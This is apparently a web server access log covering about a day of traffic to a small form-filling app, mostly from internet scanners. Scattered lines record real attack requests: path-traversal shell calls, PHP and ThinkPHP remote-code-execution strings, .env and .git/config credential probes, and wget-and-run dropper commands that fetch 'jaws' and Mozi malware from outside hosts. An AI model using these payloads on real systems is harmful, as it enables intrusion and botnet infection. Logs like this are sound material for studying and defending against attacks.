+77.83.240.4 - - [04/Aug/2025 10:41:46] "GET / HTTP/1.0" 200 -
+192.168.1.101 - - [04/Aug/2025 10:45:07] "GET /fill/example_template HTTP/1.1" 200 -
+192.168.1.101 - - [04/Aug/2025 10:45:07] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+192.168.1.101 - - [04/Aug/2025 10:45:14] "GET /templates HTTP/1.1" 200 -
+192.168.1.101 - - [04/Aug/2025 10:45:14] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+91.224.92.17 - - [04/Aug/2025 10:45:19] "GET / HTTP/1.1" 200 -
+192.168.1.101 - - [04/Aug/2025 10:46:44] "GET /fill/Disconnectors HTTP/1.1" 200 -
+192.168.1.101 - - [04/Aug/2025 10:46:44] "[36mGET /static/css/style.css HTTP/1.1[0m" 304 -
+91.224.92.17 - - [04/Aug/2025 11:02:00] "GET / HTTP/1.1" 200 -
+141.98.11.174 - - [04/Aug/2025 11:08:48] "GET / HTTP/1.1" 200 -
+198.12.123.178 - - [04/Aug/2025 11:42:50] "[33mPOST /cgi-bin/../../../../../../../../../../bin/sh HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:42:50] "[33mPOST /cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:42:51] "[33mPOST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:42:52] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:42:52] "[33mGET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:42:53] "[33mGET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:42:54] "[33mGET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:42:54] "[33mGET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:42:55] "[33mGET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:42:55] "[33mGET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:42:56] "[33mGET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:42:57] "[33mGET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:42:57] "[33mGET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:42:58] "[33mGET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:42:58] "[33mGET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:42:59] "[33mGET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:00] "[33mGET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:00] "[33mGET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:01] "[33mGET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:01] "[33mGET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:02] "[33mGET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:03] "[33mGET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:03] "[33mGET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:04] "[33mGET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:04] "[33mGET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:05] "[33mGET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:06] "[33mGET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:06] "[33mGET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:07] "[33mGET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:07] "[33mGET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:08] "[33mGET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:08] "[33mGET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:09] "[33mGET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:10] "[33mGET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:10] "[33mGET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:11] "[33mGET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:11] "[33mGET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:12] "[33mGET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:12] "[33mGET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:13] "[33mGET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:14] "[33mGET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:14] "[33mGET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:15] "[33mGET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:15] "[33mGET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1[0m" 404 -
+198.12.123.178 - - [04/Aug/2025 11:43:16] "[33mGET /containers/json HTTP/1.1[0m" 404 -
+141.98.11.57 - - [04/Aug/2025 11:46:35] code 400, message Bad request version ('}')
+141.98.11.57 - - [04/Aug/2025 11:46:35] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+20.163.74.182 - - [04/Aug/2025 11:50:42] "[33mGET /manager/text/list HTTP/1.1[0m" 404 -
+174.138.21.153 - - [04/Aug/2025 11:51:29] "[33mGET /.env HTTP/1.1[0m" 404 -
+174.138.21.153 - - [04/Aug/2025 11:51:30] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+144.172.110.50 - - [04/Aug/2025 12:01:11] "GET / HTTP/1.0" 200 -
+93.174.93.12 - - [04/Aug/2025 12:08:49] "GET / HTTP/1.0" 200 -
+91.224.92.17 - - [04/Aug/2025 12:10:37] "GET / HTTP/1.1" 200 -
+143.110.210.191 - - [04/Aug/2025 12:15:16] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03QrÊ0hÂïäÍ\x86[0zËÚ}Ò\x14h¬P4,üÁ\x8dx\x1a]&êf\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+143.110.210.191 - - [04/Aug/2025 12:15:16] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03QrÊ0hÂïäÍ\x86[0zËÚ}Ò\x14h¬P4,üÁ\x8dx\x1a]&êf\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+143.110.210.191 - - [04/Aug/2025 12:15:17] code 400, message Bad request version ('À\x14À')
+143.110.210.191 - - [04/Aug/2025 12:15:17] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03A±\x1alX%\x0cè&PÎÌë\x01\x92«/\\ {\x89Îr\x0c0ÖEÊÔÈ\x03h\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+143.110.210.191 - - [04/Aug/2025 12:15:17] "GET / HTTP/1.1" 200 -
+143.110.210.191 - - [04/Aug/2025 12:15:17] "[33mGET /form.html HTTP/1.1[0m" 404 -
+143.110.210.191 - - [04/Aug/2025 12:15:18] "[33mGET /upl.php HTTP/1.1[0m" 404 -
+143.110.210.191 - - [04/Aug/2025 12:15:18] "[33mGET /t4 HTTP/1.1[0m" 404 -
+143.110.210.191 - - [04/Aug/2025 12:15:18] "[33mGET /geoip/ HTTP/1.1[0m" 404 -
+143.110.210.191 - - [04/Aug/2025 12:15:18] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+143.110.210.191 - - [04/Aug/2025 12:15:19] "[33mGET /1.php HTTP/1.1[0m" 404 -
+143.110.210.191 - - [04/Aug/2025 12:15:19] "[33mGET /systembc/password.php HTTP/1.1[0m" 404 -
+143.110.210.191 - - [04/Aug/2025 12:15:19] "[33mGET /password.php HTTP/1.1[0m" 404 -
+87.236.176.111 - - [04/Aug/2025 12:20:48] "GET / HTTP/1.1" 200 -
+204.76.203.219 - - [04/Aug/2025 12:37:44] "GET / HTTP/1.1" 200 -
+20.127.195.254 - - [04/Aug/2025 13:18:08] "[33mGET /druid/index.html HTTP/1.1[0m" 404 -
+88.212.1.22 - - [04/Aug/2025 13:29:25] "GET / HTTP/1.1" 200 -
+54.215.98.33 - - [04/Aug/2025 13:49:50] "OPTIONS / HTTP/1.1" 200 -
+20.80.72.203 - - [04/Aug/2025 14:16:39] code 400, message Bad request syntax ('MGLNDD_83.216.144.139_80')
+20.80.72.203 - - [04/Aug/2025 14:16:39] "[31m[1mMGLNDD_83.216.144.139_80[0m" 400 -
+185.242.226.99 - - [04/Aug/2025 14:32:50] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [04/Aug/2025 14:52:18] "GET / HTTP/1.1" 200 -
+204.76.203.219 - - [04/Aug/2025 15:47:12] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [04/Aug/2025 16:53:35] "GET / HTTP/1.1" 200 -
+49.231.254.45 - - [04/Aug/2025 17:17:50] "GET / HTTP/1.0" 200 -
+205.210.31.148 - - [04/Aug/2025 17:33:21] "GET / HTTP/1.1" 200 -
+141.98.11.57 - - [04/Aug/2025 17:43:41] code 400, message Bad request version ('}')
+141.98.11.57 - - [04/Aug/2025 17:43:41] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+196.251.69.145 - - [04/Aug/2025 17:54:34] "GET / HTTP/1.1" 200 -
+196.251.114.43 - - [04/Aug/2025 18:52:41] "[33mGET /_profiler/phpinfo HTTP/1.1[0m" 404 -
+204.76.203.219 - - [04/Aug/2025 18:55:32] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [04/Aug/2025 19:04:57] "GET / HTTP/1.1" 200 -
+185.242.226.99 - - [04/Aug/2025 19:26:36] code 400, message Bad request version ('À\x14À')
+185.242.226.99 - - [04/Aug/2025 19:26:36] "[31m[1m\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03.Á\x08\x95\x9có\x1a\x0c®\x87` \x84¡\x1c\x92dÎ¾Å(óóE\x15\x8c¦»Í3ð\x8d\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+161.97.167.152 - - [04/Aug/2025 19:48:09] "[33mGET /admin/config.php HTTP/1.0[0m" 404 -
+79.124.58.198 - - [04/Aug/2025 19:56:05] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 -
+45.135.194.136 - - [04/Aug/2025 20:23:39] "GET / HTTP/1.1" 200 -
+93.174.93.12 - - [04/Aug/2025 20:32:53] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+93.174.93.12 - - [04/Aug/2025 20:32:53] "[31m[1m\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RHÅ\x1a#÷:Nßâ´\x82/ÿ\x09T\x9f§Äy°hÆ\x13\x8c¤\x1c="á\x1a\x98 \x84´,\x85¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À[0m" 400 -
+141.98.11.20 - - [04/Aug/2025 20:33:13] "GET / HTTP/1.1" 200 -
+176.65.150.43 - - [04/Aug/2025 21:03:57] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+198.55.98.76 - - [04/Aug/2025 21:12:10] "[33mGET /_profiler/phpinfo HTTP/1.1[0m" 404 -
+149.50.96.5 - - [04/Aug/2025 21:19:57] "[33mGET /dispatch.asp HTTP/1.1[0m" 404 -
+8.219.132.136 - - [04/Aug/2025 21:25:20] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1')
+8.219.132.136 - - [04/Aug/2025 21:25:20] "[31m[1mGET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1[0m" 400 -
+117.215.55.149 - - [04/Aug/2025 21:31:50] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.215.55.149:39916/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
+196.251.69.145 - - [04/Aug/2025 21:41:10] "GET / HTTP/1.1" 200 -
+93.174.93.12 - - [04/Aug/2025 21:43:50] "GET / HTTP/1.0" 200 -
+79.124.58.198 - - [04/Aug/2025 21:55:18] "[33mGET /actuator/gateway/routes HTTP/1.1[0m" 404 -
+149.50.96.114 - - [04/Aug/2025 21:59:37] "GET / HTTP/1.1" 200 -
+144.172.110.50 - - [04/Aug/2025 22:05:09] "GET / HTTP/1.0" 200 -
+204.76.203.219 - - [04/Aug/2025 22:05:23] "GET / HTTP/1.1" 200 -
+134.122.33.188 - - [04/Aug/2025 22:39:12] "[33mGET /.env HTTP/1.1[0m" 404 -
+134.122.33.188 - - [04/Aug/2025 22:39:12] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+79.124.58.198 - - [04/Aug/2025 23:16:15] code 400, message Bad request version ('À\x13À')
+79.124.58.198 - - [04/Aug/2025 23:16:15] "[31m[1m\x16\x03\x01\x05¨\x01\x00\x05¤\x03\x03ÿ\x8e§#iZ\x92dø«\x8aaR\x0d\x8d\x8e6hüY\x0c¹\x04Ç\x14\x8f\x8d:9\x9aö\x06 s\x95eâ\x86ªY\x7ft\x7f\x00ìòÜ\x14Â\x9e7\x19D8luMéÐ\x1aóÅ\x978\x8e\x00\x1aÀ+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+91.224.92.17 - - [04/Aug/2025 23:20:48] "GET / HTTP/1.1" 200 -
+147.185.133.78 - - [04/Aug/2025 23:26:48] "GET / HTTP/1.1" 200 -
+141.98.11.57 - - [04/Aug/2025 23:52:26] code 400, message Bad request version ('}')
+141.98.11.57 - - [04/Aug/2025 23:52:26] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+89.213.174.230 - - [04/Aug/2025 23:54:33] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
+128.199.137.235 - - [05/Aug/2025 00:01:33] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+205.210.31.108 - - [05/Aug/2025 00:03:09] "GET / HTTP/1.0" 200 -
+141.98.11.20 - - [05/Aug/2025 00:22:12] "GET / HTTP/1.1" 200 -
+185.242.226.99 - - [05/Aug/2025 00:52:58] "GET / HTTP/1.1" 200 -
+196.251.83.51 - - [05/Aug/2025 00:57:07] "[33mGET /.env HTTP/1.1[0m" 404 -
+149.50.96.114 - - [05/Aug/2025 01:06:06] "GET / HTTP/1.1" 200 -
+13.221.86.176 - - [05/Aug/2025 01:23:44] "GET / HTTP/1.1" 200 -
+144.172.110.50 - - [05/Aug/2025 01:37:53] "GET / HTTP/1.0" 200 -
+204.76.203.219 - - [05/Aug/2025 02:02:23] "GET / HTTP/1.1" 200 -
+88.214.25.125 - - [05/Aug/2025 02:33:16] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+88.214.25.125 - - [05/Aug/2025 02:33:16] "[31m[1m\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr[0m" 400 -
+20.51.234.214 - - [05/Aug/2025 02:37:11] "[33mGET /developmentserver/metadatauploader HTTP/1.1[0m" 404 -
+149.50.96.5 - - [05/Aug/2025 02:40:49] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [05/Aug/2025 03:07:31] "GET / HTTP/1.1" 200 -
+101.36.119.69 - - [05/Aug/2025 03:21:26] "[33mGET /version HTTP/1.1[0m" 404 -
+101.36.119.69 - - [05/Aug/2025 03:21:27] "GET / HTTP/1.1" 200 -
+101.36.119.69 - - [05/Aug/2025 03:21:27] "GET / HTTP/1.1" 200 -
+101.36.119.69 - - [05/Aug/2025 03:21:28] "[33mGET /v1 HTTP/1.1[0m" 404 -
+101.36.119.69 - - [05/Aug/2025 03:21:29] "GET / HTTP/1.1" 200 -
+8.219.60.3 - - [05/Aug/2025 03:21:53] code 400, message Bad request syntax ('GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1')
+8.219.60.3 - - [05/Aug/2025 03:21:53] "[31m[1mGET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws HTTP/1.1[0m" 400 -
+93.174.93.12 - - [05/Aug/2025 03:22:03] "GET / HTTP/1.0" 200 -
+149.50.96.5 - - [05/Aug/2025 03:28:27] "[33mGET /page/style/index.css HTTP/1.1[0m" 404 -
+198.235.24.192 - - [05/Aug/2025 03:55:48] code 400, message Bad request version ('À\x13À')
+198.235.24.192 - - [05/Aug/2025 03:55:48] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03gº\x971ôì\x08ù\x9a\x9a.\x9a\x82\x1b\x9fÂÖ×DÈ\x8fß\x01\x10[<St\x1f~\x09\x08 À¾\x9e\x08ã\x96\x1f|ºÎ\x90Q6\x07ïø¶h\x9amàÚt`EheE\x00Ò9o\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" 400 -
+198.235.24.192 - - [05/Aug/2025 03:55:48] code 400, message Bad request version ('À(À$À\x14À')
+198.235.24.192 - - [05/Aug/2025 03:55:48] "[31m[1m\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03;E[}<\x08$\x0dQ·ñópo\x10ì¬7Îi¾Ô\x99°·yòº ØÝæ\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À[0m" 400 -
+196.251.69.145 - - [05/Aug/2025 03:59:12] "GET / HTTP/1.1" 200 -
+93.174.93.12 - - [05/Aug/2025 04:16:31] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+93.174.93.12 - - [05/Aug/2025 04:16:31] "[31m[1m\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RHÅ\x1a#÷:Nßâ´\x82/ÿ\x09T\x9f§Äy°hÆ\x13\x8c¤\x1c="á\x1a\x98 \x84´,\x85¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À[0m" 400 -
+141.98.11.20 - - [05/Aug/2025 04:18:30] "GET / HTTP/1.1" 200 -
+172.236.228.229 - - [05/Aug/2025 04:30:39] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [05/Aug/2025 04:49:22] "GET / HTTP/1.1" 200 -
+149.50.96.114 - - [05/Aug/2025 04:50:07] "GET / HTTP/1.1" 200 -
+103.218.242.167 - - [05/Aug/2025 04:57:13] "GET / HTTP/1.1" 200 -
+103.218.242.167 - - [05/Aug/2025 04:57:14] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+91.224.92.17 - - [05/Aug/2025 05:03:40] "GET / HTTP/1.1" 200 -
+141.98.11.57 - - [05/Aug/2025 05:03:45] code 400, message Bad request version ('}')
+141.98.11.57 - - [05/Aug/2025 05:03:45] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+45.135.194.136 - - [05/Aug/2025 05:12:02] "GET / HTTP/1.1" 200 -
+149.50.96.5 - - [05/Aug/2025 05:20:57] "[33mGET /userRpmNatDebugRpm26525557/start_art.html HTTP/1.1[0m" 404 -
+204.76.203.219 - - [05/Aug/2025 05:30:51] "GET / HTTP/1.1" 200 -
+196.251.86.50 - - [05/Aug/2025 05:31:42] "GET / HTTP/1.0" 200 -
+162.142.125.205 - - [05/Aug/2025 05:50:11] "GET / HTTP/1.1" 200 -
+162.142.125.205 - - [05/Aug/2025 05:50:16] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+162.142.125.205 - - [05/Aug/2025 05:50:19] code 505, message Invalid HTTP version (2.0)
+162.142.125.205 - - [05/Aug/2025 05:50:19] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+162.142.125.205 - - [05/Aug/2025 05:50:40] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+162.142.125.205 - - [05/Aug/2025 05:50:43] code 505, message Invalid HTTP version (2.0)
+162.142.125.205 - - [05/Aug/2025 05:50:43] "[35m[1mPRI * HTTP/2.0[0m" 505 -
+162.142.125.205 - - [05/Aug/2025 05:50:57] code 400, message Bad request version ('À\x14À')
+162.142.125.205 - - [05/Aug/2025 05:50:57] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x80z¸§\x98ì\x17é&ßâ_\x0d\x99@\x19®$E&.ã#tÜ°`ÿq]¶\x13 0¤qN~2Æw[®ÐônD\x92\x19âÎT\x14]©\x86#Ý¨\x1fô¶\\ïñ\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À[0m" 400 -
+162.142.125.205 - - [05/Aug/2025 05:51:04] "[33mGET /wiki HTTP/1.1[0m" 404 -
+144.172.110.50 - - [05/Aug/2025 06:17:12] "GET / HTTP/1.0" 200 -
+104.234.115.53 - - [05/Aug/2025 06:24:30] "GET / HTTP/1.0" 200 -
+104.234.115.53 - - [05/Aug/2025 06:24:48] code 400, message Bad request version ('À\x14À')
+104.234.115.53 - - [05/Aug/2025 06:24:48] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03\x07ÅHÚ.\x8cÚ\x82\x14Ì(\x88Os\x93·Ä¿²»©+G6µs\x8fâÅ`¶Õ |á'ÿùÒÉx«ã\x18Öß\x84U¸\x02Ür)j\x15=¢GÊ2SV\\\x7fè\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À[0m" 400 -
+104.234.115.53 - - [05/Aug/2025 06:25:19] "GET / HTTP/1.1" 200 -
+104.234.115.53 - - [05/Aug/2025 06:29:22] code 400, message Bad request version ('À\x14À')
+104.234.115.53 - - [05/Aug/2025 06:29:22] "[31m[1m\x16\x03\x01\x00ú\x01\x00\x00ö\x03\x03e¤L\x89\x91[1\x97Æëd2\x15íü\x1d\x8eT±ñ\x9bEÎ\x13ÿ©B²Ú\x8eÃ´ ¼@áñ®R)ÅÏg.\x80~\x80J\x95\x93\x01sGj#ÓÝ#u\x0c\x19$\x91Mü\x002À/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+104.234.115.53 - - [05/Aug/2025 06:29:27] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+185.242.226.99 - - [05/Aug/2025 07:16:30] code 400, message Bad request version ('À\x14À')
+185.242.226.99 - - [05/Aug/2025 07:16:30] "[31m[1m\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03]ý¸îÜç£\x14W\x1c¶Ûf1P¯>Æyç\x03!¨/QoÆØ\x02*Óã\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+164.52.24.188 - - [05/Aug/2025 07:26:46] code 400, message Bad request version ('ú\x96')
+164.52.24.188 - - [05/Aug/2025 07:26:46] "[31m[1m\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03\x05\x0cj½\x80¡ \x04uu(À\x11r\x1c\x1e8ßÜY\x96Mç]5ª\x00:£|S~ ½$Ó\x8cþÝªÁçgM2x){0¹®\x1f\x10\x7f(´\x85ú\x96[0m" 400 -
+164.52.24.188 - - [05/Aug/2025 07:26:46] "GET / HTTP/1.1" 200 -
+20.65.195.58 - - [05/Aug/2025 07:35:03] "[33mGET /hudson HTTP/1.1[0m" 404 -
+45.135.194.136 - - [05/Aug/2025 08:33:35] "GET / HTTP/1.1" 200 -
+196.251.69.145 - - [05/Aug/2025 09:09:18] "GET / HTTP/1.1" 200 -
+204.76.203.219 - - [05/Aug/2025 09:19:09] "GET / HTTP/1.1" 200 -
+91.224.92.17 - - [05/Aug/2025 09:34:02] "GET / HTTP/1.1" 200 -
+144.172.110.50 - - [05/Aug/2025 10:07:35] "GET / HTTP/1.0" 200 -
+141.98.11.57 - - [05/Aug/2025 10:35:32] code 400, message Bad request version ('}')
+141.98.11.57 - - [05/Aug/2025 10:35:32] "[31m[1mÿ\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ñ\x03%\x00\x00\x00{ "Ret" : 100, "SessionID" : "0x0" }[0m" 400 -
+91.224.92.17 - - [05/Aug/2025 10:35:41] "GET / HTTP/1.1" 200 -
+3.131.215.38 - - [05/Aug/2025 10:53:07] "GET / HTTP/1.1" 200 -
+3.131.215.38 - - [05/Aug/2025 10:53:39] "GET / HTTP/1.1" 200 -
+184.105.139.70 - - [05/Aug/2025 11:17:14] code 400, message Bad request version ('À\x14À')
+184.105.139.70 - - [05/Aug/2025 11:17:14] "[31m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03u\x14R\x18\x06N«\x16Øõ»\x1a\x05¿e½ôx\x15\x8a \x83$g\x05÷ßúÃfÝ\\\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+64.62.156.10 - - [05/Aug/2025 11:25:31] "GET / HTTP/1.1" 200 -
+64.62.156.23 - - [05/Aug/2025 11:29:16] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+185.242.226.99 - - [05/Aug/2025 11:29:50] "GET / HTTP/1.1" 200 -
+64.62.156.10 - - [05/Aug/2025 11:30:14] "[33mGET /geoserver/web/ HTTP/1.1[0m" 404 -
+159.203.43.77 - - [05/Aug/2025 11:56:49] "[33mGET /.env HTTP/1.1[0m" 404 -
+159.203.43.77 - - [05/Aug/2025 11:56:49] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+57.128.5.88 - - [05/Aug/2025 12:11:34] "GET / HTTP/1.0" 200 -
